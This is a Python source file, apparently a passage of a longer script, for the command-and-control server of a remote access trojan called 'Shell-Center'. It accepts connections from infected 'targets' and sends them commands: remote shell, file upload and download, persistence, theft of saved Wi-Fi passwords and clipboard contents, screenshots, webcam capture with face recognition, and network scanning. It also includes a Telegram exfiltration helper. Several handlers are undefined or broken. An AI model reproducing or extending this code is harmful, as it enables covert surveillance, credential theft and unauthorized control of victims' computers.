    hidden_folder = os.path.expandvars(r"%APPDATA%\SystemConfig")  
else:  # Linux/Mac
    hidden_folder = "/var/tmp/.system_config"

hidden_file = os.path.join(hidden_folder, "target_names.txt")

# Ensure the hidden folder exists
os.makedirs(hidden_folder, exist_ok=True)
def load_target_names():
    """Load target names from the hidden file."""
    target_names = {}
    if os.path.exists(hidden_file):
        with open(hidden_file, "r", encoding="utf-8") as f:
            for line in f:
                public_ip, name = line.strip().split("=", 1)
                target_names[public_ip] = name
    return target_names
def save_target_names(target_names):
    """Save target names to the hidden file."""
    with open(hidden_file, "w", encoding="utf-8") as f:
        for public_ip, name in target_names.items():
            f.write(f"{public_ip}={name}\n")
def handle_get_clipboard(target_id, output_file=None):
    """Retrieve clipboard content from the target."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        
        print(f"[*] Requesting clipboard content from Target ID={target_id}")
        client_socket.sendall("get_clipboard".encode("utf-8"))

        data = ""
        while True:
            chunk = client_socket.recv(4096).decode("utf-8")
            if chunk.endswith("END_OF_CLIPBOARD"):
                data += chunk[:-16]
                break
            data += chunk

        if output_file:
            with open(output_file, "w", encoding="utf-8") as file:
                file.write(data)
            print(f"[+] Clipboard content saved to {output_file}")
        else:
            print(f"[Clipboard Content from Target-{target_id}]:\n{data}")

    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error: {e}")


# Send data to Telegram bot
def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("[+] Message sent to Telegram successfully.")
        else:
            print(f"[!] Failed to send message: {response.text}")
    except Exception as e:
        print(f"[!] Telegram error: {e}")

def get_saved_wifi(target_id, output_file=None):
    """Retrieve saved Wi-Fi networks and details."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        client_socket.sendall("get_saved_wifi".encode("utf-8"))

        print("[*] Retrieving saved Wi-Fi networks and passwords...")
        data = ""
        while True:
            chunk = client_socket.recv(4096).decode("utf-8")
            if chunk.endswith("END_OF_INFO"):
                data += chunk[:-11]
                break
            data += chunk

        if output_file:
            with open(output_file, "w", encoding="utf-8") as file:
                file.write(data)
            print(f"[+] Saved Wi-Fi networks written to {output_file}")
        else:
            print(f"[Saved Wi-Fi Networks]:\n{data}")
    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error: {e}")

def suggest_command(input_command, valid_commands):
    """Suggest the most similar command from valid commands."""
    suggestions = difflib.get_close_matches(input_command, valid_commands, n=3, cutoff=0.5)
    if suggestions:
        print("[!] Unknown command. Did you mean:")
        for suggestion in suggestions:
            print(f"    {green} + {suggestion}{white}")
    else:
        print(f"{green}[!] Unknown command. Run 'help' for a list of valid commands.{white}")

# Valid commands list
valid_commands = [
    "show targets", "shell", "kill", "exit", "per_file", "ask_ai", "explore_files", "explore_files", "nmap",
    "system_info", "upload", "download", "help", "get_saved_wifi", "get_clipboard", "name", "list_cameras", "search_files", "screenshot", "webcam_snap", "face_recon", "popup", "popup_image"]



def persist_file(target_id, file_path):
    """Send a file persistence command to the target."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        print(f"[*] Sending persistence request for {file_path} to Target ID={target_id}")
        client_socket.sendall(f"per_file {file_path}".encode("utf-8"))
        response = client_socket.recv(4096).decode("utf-8")
        print(response)
    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error: {e}")








def system_info(target_id, output_file=None):
    """Request system information from a specific target."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        print(f"[*] Requesting detailed system information from Target ID={target_id}")
        client_socket.sendall("system_info".encode("utf-8"))
        
        # Receive system information
        data = ""
        while True:
            chunk = client_socket.recv(4096).decode("utf-8")
            if chunk.endswith("END_OF_INFO"):
                data += chunk[:-11]
                break
            data += chunk
        
        if output_file:
            with open(output_file, "w", encoding="utf-8") as file:
                file.write(data)
            print(f"[+] System information saved to {output_file}")
        else:
            print(f"[System Info from Target-{target_id}]:\n{data}")
    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error during system info request: {e}")




def persiste_target(target_id, file_path):
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        print(f"[*] Persisting file={file_path} Into Target ID={target_id}")
        client_socket.sendall("per_file".encode("utf-8"))
    except KeyError:
        print("[!] Invalid Target ID")
    except KeyError:
        print("[!] File Path Not Found")
    except Exception as e:
        print(f"[!] Error: {e}")

def download(target_id, file_path, save_path):
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        
        # Properly format the command with quotes if spaces exist
        if " " in file_path:
            file_path = f'"{file_path}"'
        client_socket.sendall(f"download {file_path}".encode("utf-8"))
        
        # First receive file size (16 bytes)
        size_data = client_socket.recv(16)
        if not size_data:
            raise ConnectionError("No size header received")
            
        try:
            file_size = int(size_data.decode("utf-8").strip())
        except ValueError:
            # Might be an error message instead of size
            error_msg = size_data + client_socket.recv(4096)
            raise ConnectionError(error_msg.decode("utf-8", errors="ignore"))
            
        # Receive file content
        received = 0
        with open(save_path, "wb") as file:
            while received < file_size:
                remaining = file_size - received
                chunk_size = min(65536, remaining)
                chunk = client_socket.recv(chunk_size)
                if not chunk:
                    raise ConnectionError("Connection lost during transfer")
                file.write(chunk)
                received += len(chunk)
                print(f"\r[+] Downloaded: {received/1024:.1f}KB/{file_size/1024:.1f}KB ({received/file_size:.1%})", end="")
                
        print(f"\n[+] File downloaded successfully to {save_path}")
        
    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"\n[!] Download failed: {str(e)}")
        if os.path.exists(save_path):
            os.remove(save_path)  # Cleanup partial file





def upload(target_id, file_path, save_path):
    """Upload a file to the target machine."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        print(f"[*] Uploading file: {file_path} to Target ID={target_id} at {save_path}")
        
        # Send upload command
        client_socket.sendall(f"upload {save_path}".encode("utf-8"))
        
        # Read and send file content
        with open(file_path, "rb") as file:
            while chunk := file.read(4096):
                client_socket.sendall(chunk)
        client_socket.sendall(b"END_OF_FILE")
        
        print(f"[+] File uploaded successfully to {save_path}")
    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error during file upload: {e}")




def help_menu():
    # ANSI color codes for a more 'console' feel
    HEADER_COLOR = "\033[1;36m"  # Cyan, bold
    COMMAND_COLOR = "\033[0;31m" # Green
    DESC_COLOR = "\033[0;37m"    # Light gray
    RESET_COLOR = "\033[0m"      # Reset to default

    print(f"\n{HEADER_COLOR}Shell-Center Commands:{RESET_COLOR}\n")

    # Define commands in a list of tuples: (command, description)
    commands = [
        ("show targets", "Display all connected targets."),
        ("name <ID> \"CustomName\" / --remove-name", "Assign or remove a custom name for a target."),
        ("shell <ID>", "Enter an interactive shell with a target."),
        ("per_file <ID> <FilePathInTarget>", "Persist a file on the target device."),
        ("system_info <ID> [-o output.txt]", "Get detailed system information from a target."),
        ("upload <ID> <LocalFilePath> <RemoteSavePath>", "Upload a file to the target machine."),
        ("download <ID> <RemoteFilePath> <LocalSavePath>", "Download a file from the target machine."),
        ("files <ID> <extension> [--not-system] [-o output.txt]", "Search for files by extension on the target."),
        ("get_saved_wifi <ID> [-o output.txt]", "Extract saved Wi-Fi networks and passwords."),
        ("get_clipboard <ID> [-o output.txt]", "Extract clipboard content from the target."),
        ("network_scan <ID> [-o output.txt]", "Scan the target's local network for active devices."),
        ("list_cameras <ID>", "List available cameras on the target device."),
        ("screenshot <ID> <SavePath.png>", "Capture a screenshot from the target device."),
        ("webcam_snap <ID> <CameraIndex> <SavePath.jpg>", "Capture a photo from the target's webcam."),
        ("face_recon <ID> <CameraIndex>", "Detect and save unique faces from a target's webcam."),
        ("explore_files <ID>", "Open a GUI file explorer for the target."),
        ("ask_ai <question> ", "Ask a question to the AI (e.g., ask_ai What is Python?)"),
        ("popup <ID> <Title> <Message>", "Display a popup message box on the target's screen."),
        ("kill <ID>", "Terminate the connection with a target."),
        ("clear", "Clear the terminal screen."),
        ("help", "Display this help menu."),
        ("exit", "Shut down the Shell-Center server.")
    ]

    # Print commands with consistent spacing
    # Find the maximum length of the command string to align descriptions
    max_cmd_len = max(len(cmd) for cmd, _ in commands)

    for cmd, desc in commands:
        print(f"  {COMMAND_COLOR}{cmd.ljust(max_cmd_len)}{RESET_COLOR}  {DESC_COLOR}{desc}{RESET_COLOR}")

    print(f"\n{HEADER_COLOR}Type 'help' for this list.{RESET_COLOR}")

target_names = load_target_names()  # Load names when script starts

def handle_target(client_socket, client_address):
    """Handle individual target connection and store its details."""
    global target_id_counter
    try:
        # Set timeout to prevent hanging
        client_socket.settimeout(10)

        # Receive initial data
        data = b""
        while True:
            chunk = client_socket.recv(4096)
            if not chunk:
                print(f"[!] Connection closed by {client_address} before sending data.")
                client_socket.close()
                return
            data += chunk
            if b"\n" in chunk:  # Look for newline as message terminator
                break

        try:
            initial_message = data.decode("utf-8").strip()
        except UnicodeDecodeError:
            print(f"[!] Received non-UTF-8 data from {client_address}")
            client_socket.close()
            return

        # Heartbeat check
        if "HEARTBEAT_CHECK" in initial_message:
            print(f"\n[INFO] Heartbeat received from {client_address}.")
            client_socket.close()
            return

        # Parse the initial message
        parts = initial_message.split("|")
        if len(parts) == 3:
            os_info, public_ip, target_name = parts
        else:
            os_info, public_ip, target_name = "Unknown", "Unknown", "None"

        # Check for existing connection from same public IP
        existing_target_id = None
        for target_id, target_info in targets.items():
            if target_info["public_ip"] == public_ip:
                existing_target_id = target_id
                break

        if existing_target_id is not None:
            print(f"[INFO] Reconnection from {public_ip}. Reusing Target ID={existing_target_id}")
            old_target = targets.pop(existing_target_id)
            try:
                old_target["socket"].close()
            except:
                pass
            targets[existing_target_id] = {
                "socket": client_socket,
                "address": client_address,
                "public_ip": public_ip,
                "os": old_target["os"],
                "name": old_target["name"]
            }
            return

        # New connection
        target_id = target_id_counter
        target_id_counter += 1

        targets[target_id] = {
            "socket": client_socket,
            "address": client_address,
            "public_ip": public_ip,
            "os": os_info,
            "name": target_name
        }

        print(f"[+] New Target Connected: ID={target_id}, OS={os_info}, Public IP={public_ip}, Name={target_name}, Address={client_address}")

        # Keep the thread alive (could handle more features here)
        while True:
            try:
                data = client_socket.recv(1)
                if not data:
                    break
            except:
                break

    except socket.timeout:
        #print(f"[!] Timeout from {client_address}")
        fuck = 2
        client_socket.close()
    except Exception as e:
        print(f"[!] Error handling connection from {client_address}: {str(e)}")
        client_socket.close()







def set_target_name(target_id, name):
    """Assign or remove a name from a target."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]

        if name == "--remove-name":
            client_socket.sendall("name --remove-name".encode("utf-8"))
            target["name"] = "None"  # Update locally
            print(f"[+] Name removed for Target ID {target_id}")
        else:
            client_socket.sendall(f"name {name}".encode("utf-8"))
            target["name"] = name  # Update locally
            print(f"[+] Name '{name}' assigned to Target ID {target_id}")

    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error updating target name: {e}")







def start_server(listen_ip, listen_port):
    """Start the server and listen for incoming connections."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # This line prevents "Address already in use"
    try:
        server_socket.bind((listen_ip, listen_port))
        server_socket.listen(5)
        print(f"[*] Listening on {listen_ip}:{listen_port}")
        while True:
            client_socket, client_address = server_socket.accept()
            threading.Thread(target=handle_target, args=(client_socket, client_address), daemon=True).start()
    except Exception as e:
        print(f"[!] Server error: {e}")
    finally:
        server_socket.close()



def show_targets():
    """Display all connected targets in a formatted table with names."""
    if not targets:
        print("[*] No targets connected.")
    else:
        headers = ["Target ID", "Name", "Public IP", "Port", "OS Type"]
        column_widths = [10, 15, 15, 6, 20]  # Adjust column widths

        def draw_line():
            print("+" + "+".join(["-" * (w + 2) for w in column_widths]) + "+")

        draw_line()
        print("| " + " | ".join(h.ljust(w) for h, w in zip(headers, column_widths)) + " |")
        draw_line()

        for target_id, target_info in targets.items():
            name = target_info["name"] if target_info["name"] else "None"
            public_ip = target_info["public_ip"]
            _, port = target_info["address"]
            os_type = target_info["os"]
            row = [str(target_id), name, public_ip, str(port), os_type]
            print("| " + " | ".join(cell.ljust(w) for cell, w in zip(row, column_widths)) + " |")

        draw_line()





def connect_to_target(target_id): # This is likely your existing function signature
    """Connect to a specific target with an advanced, interactive shell."""
    try:
        target = targets[target_id]
        client_socket = target["socket"] # client_socket is defined here!

        # Initialize target_cwd before its first use.
        # Choose a sensible default (e.g., '/' for Linux/macOS or 'C:\\' for Windows)
        # The actual cwd will be updated after the first command response.
        target_cwd = "/" # Or "C:\\" if your target is primarily Windows

        print(f"[*] Interacting with Target ID={target_id}, OS={target['os']}")
        print("[*] Type 'exit' or 'quit' to return to the main menu.")

        # The ENTIRE while True loop below MUST be indented inside this function
        while True:
            try:
                # Use target_cwd in the prompt, which is now initialized
                command = input(f"Shell-Target({red}{target_cwd}{white})> ").strip()
                if command.lower() in ["exit", "quit"]:
                    print(f"[*] Exiting Target ID={target_id}'s shell.")
                    # Optionally, send a specific "exit_shell" command to the target here
                    # client_socket.sendall(b"exit_shell")
                    break # Exit the while loop to return from connect_to_target
                elif not command:
                    continue # If command is empty, ask for another input

                # Send the command to the target
                client_socket.sendall(command.encode("utf-8"))

                # --- New Data Reception Protocol ---
                # Set a timeout for receiving the initial 8-byte header
                client_socket.settimeout(30) # For example, wait up to 30 seconds for the header

                size_header = client_socket.recv(8)
                if not size_header:
                    print("[!] Connection lost (no size header received).")
                    break # Break if connection is lost or target closed

                # Unpack the header to get the full data size
                try:
                    expected_size = struct.unpack('!Q', size_header)[0]
                except struct.error:
                    print("[!] Received malformed size header (could not unpack).")
                    break # Malformed header, cannot proceed reliably

                # Receive data in a loop until all of it is received
                received_data = b""
                # Set a longer timeout for receiving the entire data payload
                client_socket.settimeout(60) # For example, wait up to 60 seconds for the full response

                while len(received_data) < expected_size:
                    try:
                        # Receive data in chunks, up to 4096 bytes or remaining expected size
                        chunk = client_socket.recv(min(4096, expected_size - len(received_data)))
                        if not chunk:
                            print("[!] Connection lost during data transfer (incomplete data).")
                            break # Connection closed prematurely by target
                        received_data += chunk
                    except socket.timeout:
                        print(f"[!] Timeout during data reception. Received {len(received_data)} of {expected_size} bytes.")
                        break # Break if timeout occurs during receiving data
                    except Exception as recv_error:
                        print(f"[!] Error receiving data chunk: {recv_error}")
                        break # Break on other receiving errors

                # Check if we successfully received the full expected size
                if len(received_data) != expected_size:
                    print(f"[!] Incomplete response received. Expected {expected_size} bytes, got {len(received_data)} bytes.")
                    continue # Skip processing this incomplete response and prompt for new command

                # Decode and parse the JSON data
                try:
                    response = json.loads(received_data.decode('utf-8'))
                except json.JSONDecodeError:
                    print(f"[!] Received non-JSON or malformed JSON response from target.")
                    print(f"Raw response (first 200 chars): {received_data.decode('utf-8', errors='ignore')[:200]}...")
                    continue # Skip processing this malformed response

                # Update the current working directory for the next prompt from the target's response
                target_cwd = response.get('cwd', '?') # Use '?' as a fallback if 'cwd' is missing
                # Print stdout and stderr from the JSON response, with colors
                if response.get('stdout'):
                    print(green + response['stdout'].strip())
                if response.get('stderr'):
                    print(red + response['stderr'].strip())

            except KeyboardInterrupt:
                print("\n[*] To exit the shell, type 'exit' or 'quit'.")
            except socket.timeout:
                print(f"\n{red}[!] Shell command timed out. Target might be unresponsive or command is taking too long.{white}")
            except Exception as e:
                # Catch any other unexpected errors during shell interaction
                print(f"\n{red}[!] An unhandled error occurred during shell interaction: {e}{white}")
                break # Exit the loop on unhandled errors to prevent continuous errors
            finally:
                # Always reset socket timeout after each command to avoid affecting subsequent operations
                # This line MUST be inside the connect_to_target function.
                client_socket.settimeout(10) # Reset to a default timeout (e.g., 10 seconds)

    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"{red}[!] Error connecting to target: {e}{white}")






def kill_target(target_id):
    """Kill the connection with a specific target."""
    try:
        target = targets.pop(target_id)
        target["socket"].sendall("kill".encode("utf-8"))  # Send kill command to the target
        target["socket"].close()
        print(f"[*] Target ID={target_id} has been killed.")
    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error while killing target: {e}")



def clear_terminal():
    """Clear the terminal screen."""
    os.system("cls" if os.name == "nt" else "clear")





# Update the valid_commands list to include the new command
valid_commands = [
    "show targets", "shell", "kill", "exit","per_file", 
    "system_info", "upload", "download", "search_files", "help", "get_saved_wifi", "explore_files", "nmap",
    "get_clipboard", "name", "screenshot", "webcam_snap", "face_recon", "popup", "popup_image", "ask_ai", "explore_files"
]






if __name__ == "__main__":
    LISTEN_IP = "0.0.0.0"  # Listen on all interfaces
    LISTEN_PORT = 5665     # Replace with desired port
    threading.Thread(target=start_server, args=(LISTEN_IP, LISTEN_PORT), daemon=True).start()



    while True:
        target_cwd = "/"
        time.sleep(0.1)
        command = input(f"{white}Shell-Center {red}({current_dir}){white}> ").strip()
        if command == "show targets":
            show_targets()
        elif command.startswith("shell"):
            try:
                target_id = int(command.split()[1])
                # IMPORTANT: Pass the client_socket from the targets dictionary
                # to the connect_to_target function.
                # Your current code likely does this:
                # connect_to_target(target_id)
                # But the connect_to_target function itself needs to get the socket
                # from the 'targets' dictionary. The code above already does that.
                # So, ensure your call to connect_to_target looks like this:
                connect_to_target(target_id) # This call is correct if connect_to_target
                                             # retrieves client_socket internally.
            except (IndexError, ValueError):
                print("[!] Usage: shell <Target ID>")
        
        elif command.startswith("kill"):
            try:
                target_id = int(command.split()[1])
                kill_target(target_id)
            except (IndexError, ValueError):
                print("[!] Usage: kill <Target ID>")
        elif command == "clear":
            clear_terminal()
        elif command == "exit":
            print("[*] Shutting down the server.")
            break
        elif command.startswith("name "):
            try:
                parts = command.split(" ", 2)
                target_id = int(parts[1])
                name = parts[2].strip('"')  # Remove surrounding quotes
                set_target_name(target_id, name)
            except (IndexError, ValueError):
                print("[!] Usage: name <Target ID> \"Custom Name\" or name <Target ID> --remove-name")
        elif command.startswith("ask_ai"):
            try:
                question = command.split(' ', 1)[1].strip()
                if not question:
                    print("[!] Usage: ask_ai <your question here>")
                    continue
                
                ai_response = ask_deepai(question)
                print(f"\n[AI Response]\n{ai_response}\n") # Added \n before [AI Response]

            except IndexError:
                print("[!] Usage: ask_ai <your question here>")
            except Exception as e:
                print(f"[!] Error processing AI command: {e}")
        

        elif command.startswith("popup_image"):
            try:
                parts = shlex.split(command)
                if len(parts) != 3:
                    print(f"{error} Usage: popup_image <Target ID> <LocalImagePath>")
                else:
                    target_id = int(parts[1])
                    image_path = parts[2]
                    handle_popup_image(target_id, image_path)
            except (IndexError, ValueError):
                print(f"{error} Usage: popup_image <Target ID> <LocalImagePath>")
            except Exception as e:
                print(f"{error} Error processing popup_image command: {e}")
            except Exception as e:
                try:
                    print(f"[ERROR] Failed to start stream: {e}")
                except:
                    print(f"[ERROR] Failed to start stream: {e}")
        elif command.startswith("nmap"):
            try:
                parts = shlex.split(command) # Use shlex to correctly handle spaces in arguments
                if len(parts) < 3:
                    print(f"{error} Usage: nmap <Target ID> <Nmap Arguments>")
                else:
                    target_id = int(parts[1])
                    nmap_args = " ".join(parts[2:]) # Join remaining parts as nmap arguments
                    handle_nmap(target_id, nmap_args)
            except (IndexError, ValueError):
                print(f"{error} Usage: nmap <Target ID> <Nmap Arguments>")
            except Exception as e:
                print(f"{error} Error processing nmap command: {e}")
        elif command.startswith("system_info"):
            try:
                parts = command.split()
                target_id = int(parts[1])
                output_file = parts[3] if len(parts) > 3 and parts[2] == "-o" else None
                system_info(target_id, output_file)
            except (IndexError, ValueError):
                print("[!] Usage: system_info <Target ID> [-o output_file.txt]")
        elif command.startswith("screenshot"):
            try:
                parts = command.split()
                target_id = int(parts[1])
                save_path = parts[2]
                handle_screenshot(target_id, save_path)
            except (IndexError, ValueError):
                print("[!] Usage: screenshot <Target ID> <SavePath.png>")
        elif command.startswith("explore_files"):
            try:
                target_id = int(command.split()[1])
                # Run the GUI in a separate thread to not block the main console
                threading.Thread(target=explore_files_gui, args=(target_id,), daemon=True).start()
            except (IndexError, ValueError):
                print("[!] Usage: explore_files <Target ID>")
            except Exception as e:
                print(f"[!] Error starting file explorer GUI: {e}")
        elif command.startswith("webcam_snap"):
            try:
                parts = command.split()
                target_id = int(parts[1])
                camera_index = int(parts[2])
                save_path = parts[3]
                handle_webcam_snap(target_id, camera_index, save_path)
            except (IndexError, ValueError):
                print("[!] Usage: webcam_snap <Target ID> <CameraIndex> <SavePath.jpg>")
        elif command.startswith("face_recon"):
            try:
                parts = command.split()
                target_id = int(parts[1])
                camera_index = int(parts[2])
                handle_face_recon(target_id, camera_index)
            except (IndexError, ValueError):
                print("[!] Usage: face_recon <Target ID> <CameraIndex>")
        elif command.startswith("popup"):
            try:
                # Use shlex to correctly handle quoted strings
                args = shlex.split(command)
                if len(args) != 4:
                    print('[!] Usage: popup <Target ID> "Title" "Message"')
                else:
                    target_id = int(args[1])
                    title = args[2]
                    message = args[3]
                    handle_popup(target_id, title, message)
            except (IndexError, ValueError):
                print('[!] Usage: popup <Target ID> "Title" "Message"')
            except Exception as e:
                print(f"[!] Error processing popup command: {e}")
        elif command.startswith("get_saved_wifi"):
            try:
                parts = command.split()
                target_id = int(parts[1])
                output_file = parts[3] if len(parts) > 3 and parts[2] == "-o" else None
                get_saved_wifi(target_id, output_file)
            except (IndexError, ValueError):
                print("[!] Usage: get_saved_wifi <Target ID> [-o output_file.txt]")
            except Exception as e:
                print(f"[!] Error handling get_saved_wifi: {e}")
        elif command.startswith("get_clipboard"):
            try:
                parts = command.split()
                target_id = int(parts[1])
                output_file = parts[3] if len(parts) > 3 and parts[2] == "-o" else None
                handle_get_clipboard(target_id, output_file)
            except (IndexError, ValueError):
                print("[!] Usage: get_clipboard <Target ID> [-o output_file.txt]")
        elif command.startswith("list_cameras"):
            try:
                target_id = int(command.split()[1])
                handle_list_cameras(target_id)
            except (IndexError, ValueError):
                print("[!] Usage: list_cameras <Target ID>")
        elif command.startswith("per_file"):
            try:
                _, target_id, file_path = command.split(maxsplit=2)
                target_id = int(target_id)
                target = targets[target_id]
                client_socket = target["socket"]
                print(f"[*] Persisting file: {file_path} on Target ID: {target_id}")
                client_socket.sendall(f"per_file {file_path}".encode("utf-8"))
                response = client_socket.recv(4096).decode("utf-8")
                print(response)
            except ValueError:
                print("[!] Usage: per_file <Target ID> <FilePathInTargetDevice>")
            except KeyError:
                print("[!] Invalid Target ID")
            except Exception as e:
                print(f"[!] Error: {e}")
        elif command.startswith("search_files"):
            parts = command.split()
            if len(parts) >= 3:
                try:
                    target_id = int(parts[1])
                    extension = parts[2]
                    exclude = "--not-system" in parts

                    output_file = None
                    if "-o" in parts:
                        o_index = parts.index("-o")
                        if o_index + 1 < len(parts):
                            output_file = parts[o_index + 1]
                        else:
                            print(f"{error} Missing filename after -o")
                            continue

                    handle_search_files(target_id, extension, exclude, output_file)
                except Exception as e:
                    print(f"{error} Invalid command format: {e}")
            else:
                print(f"{error} Usage: search_files <target_id> <extension> [--not-system] [-o <file>]")

                print(f"{error} Usage: search_files <target_id> <extension> [--not-system]")
        elif command.startswith("upload"):
            try:
                _, target_id, file_path, save_path = command.split(maxsplit=3)
                target_id = int(target_id)
                upload(target_id, file_path, save_path)
            except (IndexError, ValueError):
                print("[!] Usage: upload <Target ID> <FilePathInAttackerMachine> <SavePathInTargetMachine>")
        elif command == "":
            pass
        elif command.startswith("download"):
            try:
                # Use shlex.split to correctly handle quoted arguments
                args = shlex.split(command)
                if len(args) != 4:
                    raise ValueError("[!] Usage: download <Target ID> <FilePathOnTarget> <SavePathOnAttacker>")

                target_id = int(args[1])
                file_path = args[2]
                save_path = args[3]

                # Call the download function
                download(target_id, file_path, save_path)
            except ValueError as e:
                print(e)
            except Exception as e:
                print(f"[!] Error: {e}")
        elif command.split()[0] in [
    'ls', 'pwd', 'mkdir', 'rmdir', 'rm', 'cp', 'mv', 'touch', 'find', 'locate',
    'cat', 'less', 'more', 'nano', 'vim', 'head', 'tail', 'wc', 'dir'
    'chmod', 'chown', 'umask',
    'ps', 'top', 'htop', 'jobs',
    'ping', 'curl', 'wget', 'netstat', 'ifconfig', 'ip', 'nslookup', 'traceroute',
    'df', 'du', 'mount', 'umount',
    'whoami', 'who', 'adduser', 'useradd', 'passwd', 'su', 'sudo', 'id',
    'uptime', 'free', 'vmstat', 'iostat',
    'tar', 'gzip', 'gunzip', 'zip', 'unzip',
    'grep', 'awk', 'sed',
    'uname', 'hostname', 'lsb_release', 'dmesg',
    'apt update', 'apt upgrade', 'apt install', 'apt remove',
    'history', 'alias', 'echo', 'man', 'shutdown'
    'dir', 'cls', 'copy', 'xcopy', 'robocopy', 'del', 'erase',
    'md', 'rd', 'tree', 'move', 'ren', 'rename',
    'type', 'more', 'echo', 'find', 'findstr',
    'attrib', 'fc', 'comp', 'tasklist', 
    'ipconfig', 'ping', 'tracert', 'pathping', 'netstat',
    'nslookup', 'arp', 'route', 'getmac', 'net',
    'net user', 'net share', 'net view', 'net use', 'net start', 'net stop',
    'systeminfo', 'taskmgr', 'diskpart', 'chkdsk',
    'sfc', 'dism', 'format', 'diskcopy',
    'shutdown', 'logoff', 'restart', 'gpupdate', 'gpresult',
    'set', 'setx', 'title', 'pause', 'call',
    'for', 'if', 'goto', 'exit', 'prompt',
    'time', 'date', 'ver', 'vol', 'label',
    'color','assoc', 'ftype',
    'wmic', 'powershell', 'start', 'cmdkey',
    'whoami', 'hostname', 'msg', 'schtasks', 'reg',
    'reg add', 'reg delete', 'reg query', 'reg export', 'reg import',
    'cacls', 'icacls', 'cipher',
    'powercfg', 'ping', 'fc', 'compact', 'openfiles',
    'taskview', 'diskpart', 'chcp'
        ]:
            try:
                # Execute the command locally
                result = subprocess.run(command, shell=True, text=True, capture_output=True)
                print(green + result.stdout if result.stdout else result.stderr)
            except Exception as e:
                print(f"[!] Error running command: {e}")
        elif command.startswith("cd"):
            try:
                # Change the current directory
                parts = command.split(maxsplit=1)
                if len(parts) < 2:
                    print(current_dir)  # If no argument is given, print the current directory
                else:
                    new_dir = parts[1]
                    os.chdir(new_dir)
                    current_dir = os.getcwd()  # Update the current directory
            except FileNotFoundError:
                print(f"[!] Directory not found: {new_dir}")
            except Exception as e:
                print(f"[!] Error changing directory: {e}")
        elif command == "dir":
            if os_name == 'Windows':
                result = subprocess.run('dir', shell=True, text=True, capture_output=True)
                print(green + result.stdout if result.stdout else result.stderr)
            else:
                print("'dir' command not found on your system")
                print(os_name)

        elif command == "help":
            help_menu()
        else:
            command_parts = command.split()
            if command_parts:
                suggest_command(command_parts[0], valid_commands)
            else:
                print("[!] Unknown command. Run 'help' for a list of valid commands.")
